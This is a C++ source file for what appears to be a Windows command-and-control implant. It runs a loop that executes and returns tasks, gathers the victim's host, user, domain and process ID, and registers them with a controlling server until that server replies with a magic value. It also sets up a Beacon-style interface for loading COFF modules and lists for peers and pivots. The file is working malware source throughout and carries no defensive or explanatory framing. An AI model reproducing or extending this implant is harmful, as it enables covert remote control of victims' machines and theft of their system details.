#include "Implant.h"
#include "Coff.h"
#include "Peer.h"

IMPLANT g_Implant;

/*
 * @brief Main loop for executing and sending tasks
 */
VOID ImplantLoop()
{
    while (1)
    {
        ImplantExecute(MAX_TASK_EXECUTE_COUNT);
        ImplantSendTasks(MAX_TASK_SEND_COUNT);
        Sleep(5000);
    }
}

json ImplantMetaData()
{
    json info;
    char hostName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hostLen = sizeof(hostName);
    char userName[256 + 1];
    DWORD userLen = sizeof(userName);
    char domainName[256];
    DWORD domainLen = sizeof(domainName);

    info["host"] = "";
    if (GetComputerNameA(hostName, &hostLen))
    {
        info["host"] = hostName;
    }

    info["user"] = "";
    if (GetUserNameA(userName, &userLen))
    {
        info["user"] = userName;
    }

    info["domain"] = "";
    if (GetComputerNameExA(ComputerNameDnsDomain, domainName, &domainLen))
    {
        if (domainLen > 0)
        {
            info["domain"] = domainName;
        }
    }

    info["pid"] = std::to_string(GetCurrentProcessId());
    info["os"] = "win";

    return info;
}

/*
 * @brief Send checkin request
 */
VOID ImplantRegister()
{
    json checkin;
    json response;

    checkin["name"] = "register";
    checkin["artifact"] = ImplantMetaData().dump().c_str();

    while (1)
    {
        if (!ImplantSendCheckin(checkin, response))
        {
            // Sleep(5000);
            continue;
        }

        if (response.contains("magic"))
        {
            auto magic = response["magic"].get<string>();
            if (magic == "baadf00d")
                return;
        }
        else
        {
            printf("Invalid server response: %s\n", response.dump(4).c_str());
        }

        Sleep(5000);
    }
}

extern LIST_ENTRY g_PivotList;

/*
 * @brief Initialize implant object
 */
BOOL ImplantInitialize()
{
    g_Implant.SessionID = RandomUint32();
    g_Implant.IsImpersonating = FALSE;
    g_Implant.Interface.SessionID = g_Implant.SessionID;
    g_Implant.Interface.BeaconDataInt = BeaconDataInt;
    g_Implant.Interface.BeaconDataExtract = BeaconDataExtract;
    g_Implant.Interface.BeaconDataParse = BeaconDataParse;
    g_Implant.Interface.BeaconDataLength = BeaconDataLength;
    g_Implant.Interface.BeaconDataShort = BeaconDataShort;
    // TODO: pass GetProcAddress and GetModuleHandle

    InitializeListHead(&g_PeerList);
    //InitializeListHead(&g_PivotList);
    InitializeListHead(&g_Implant.JobList);
    InitializeListHead(&g_Implant.TaskRequestList);
    InitializeListHead(&g_Implant.TaskResponseList);

    if (!ChannelInitialize())
    {
        return FALSE;
    }

    return TRUE;
}
